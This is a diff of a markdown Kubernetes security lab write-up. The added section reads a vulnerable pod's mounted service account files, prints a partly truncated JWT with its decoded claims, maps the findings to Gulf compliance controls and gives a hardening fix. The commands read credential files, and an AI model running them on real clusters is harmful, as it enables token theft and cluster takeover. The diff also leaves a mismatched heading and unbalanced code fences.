@@ -675,14 +675,78 @@ kubectl get secrets -A --as=system:serviceaccount:ai-governance:vuln-app-sa
 
 ## Attack 8.3 — Verify Zero Network Policies
 
-```powershell
-kubectl get networkpolicies -A
-```
+kubectl exec -n ai-governance deploy/vuln-app -- ls -la /var/run/secrets/kubernetes.io/serviceaccount/
 
 **Output:**
+total 4
+drwxrwxrwt 3 root root 140 Apr 18 00:44 .
+drwxr-xr-x 3 root root 4096 Apr 18 00:44 ..
+drwxr-xr-x 2 root root 100 Apr 18 00:44 ..2026_04_18_00_44_31.1921424147
+lrwxrwxrwx 1 root root 32 Apr 18 00:44 ..data -> ..2026_04_18_00_44_31.1921424147
+lrwxrwxrwx 1 root root 13 Apr 18 00:44 ca.crt -> ..data/ca.crt
+lrwxrwxrwx 1 root root 16 Apr 18 00:44 namespace -> ..data/namespace
+lrwxrwxrwx 1 root root 12 Apr 18 00:44 token -> ..data/token
 
-```
-No resources found
+**Analysis:** The mount uses Kubernetes' projected-volume mechanism — a timestamped directory (`..2026_04_18_...`) holds the real files, and `..data` is a symlink that atomically swaps when the token is rotated. The pod sees three files: `ca.crt` (cluster CA), `namespace` (pod's namespace), and `token` (the JWT).
+### Read the namespace file
+```powershell
+kubectl exec -n ai-governance deploy/vuln-app -- cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+
+**Output:**
+ai-governance
+
+**Analysis:** Confirms the pod is running in the `ai-governance` namespace — useful reconnaissance for targeting same-namespace resources.
+### Exfiltrate the JWT
+```powershell
+kubectl exec -n ai-governance deploy/vuln-app -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+**Output:**
+eyJhbGciOiJSUzI1NiIsImtpZCI6IjlGeDhRaTdDM2Z5a0d1SEV5QmJuT3RsSFFrZFh5bmRoakZqWFhwOGhTbWMifQ.eyJhdWQiOlsiaHR0cHM6Ly9jb250YWluZXIuZ29vZ2xlYXBpcy5jb20vdjEvcHJvamVjdHMvbGFiLTVjc2VjLTMxNzAwOS9sb2NhdGlvbnMvdXMtY2VudHJhbDEtYS9jbHVzdGVycy92dWxuLWdrZS1jbHVzdGVyIl0sImV4cCI6MTgwODAwOTA3MSwiaWF0IjoxNzc2NDczMDcxLCJpc3MiOiJodHRwczovL2NvbnRhaW5lci5nb29nbGVhcGlzLmNvbS92MS9wcm9qZWN0cy9sYWItNWNzZWMtMzE3MDA5L2xvY2F0aW9ucy91cy1jZW50cmFsMS1hL2NsdXN0ZXJzL3Z1bG4tZ2tlLWNsdXN0ZXIiLCJqdGkiOiI3MzMyMmJlMi05YzY5LTQ5ZTctOWRhNy02NjllZGEwMTkyYzgiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImFpLWdvdmVybmFuY2UiLCJub2RlIjp7...[truncated]
+
+**Decoded payload:**
+```json
+{
+"aud": ["https://container.googleapis.com/v1/projects/lab-5csec-317009/locations/us-central1-a/clusters/vuln-gke-cluster"],
+"exp": 1808009071,
+"iat": 1776473071,
+"iss": "https://container.googleapis.com/v1/projects/lab-5csec-317009/locations/us-central1-a/clusters/vuln-gke-cluster",
+"kubernetes.io": {
+"namespace": "ai-governance",
+"pod": { "name": "vuln-app-5857899f68-s6k67" },
+"serviceaccount": { "name": "vuln-app-sa" }
+},
+"sub": "system:serviceaccount:ai-governance:vuln-app-sa"
+}
+
+**Analysis:** The decoded JWT reveals:
+- `sub: system:serviceaccount:ai-governance:vuln-app-sa` — this is the identity K8s sees when the token is presented
+- `aud` — the GKE cluster this token is valid for
+- `exp: 1808009071` — the token's expiration (Unix epoch)
+- Pod name and node identity (useful for the attacker to correlate)
+Combined with **Attack 8.1** (wildcard RBAC), this JWT grants **cluster-admin equivalent** access to the entire cluster — every namespace, every secret, every pod. The attacker can now authenticate to the Kubernetes API as `vuln-app-sa` from anywhere they can reach the API server.
+### GCC Compliance Impact
+| Framework | Control | Breach |
+|-----------|---------|--------|
+| **NCA-ECC** | **1-1-3** | Service account token mounted into every pod by default |
+| **NCA-ECC** | **2-3-2** | Privilege escalation path available with no additional authentication |
+| **SAMA-CSF** | **3.2.1** | Workload identity not separated from workload compromise |
+| **SAMA-CSF** | **3.2.3** | Credential (JWT) stored at a well-known filesystem path |
+### Defensive Fix
+```yaml
+In your Deployment spec:
+spec:
+automountServiceAccountToken: false # Disable the default mount
+
+Or at the pod level:
+spec:
+template:
+spec:
+automountServiceAccountToken: false
+containers:
+- name: app
+# only enable for pods that genuinely need K8s API access
+
+If a pod genuinely needs API access, give it its own narrowly-scoped ServiceAccount and Role — never share the default SA, and never bind it to cluster-admin.
 ```
 
 **Analysis:** Zero NetworkPolicies in the entire cluster. Any pod can reach any other pod unrestricted — a direct NCA-ECC 2-2-1 (Network Segmentation) breach.
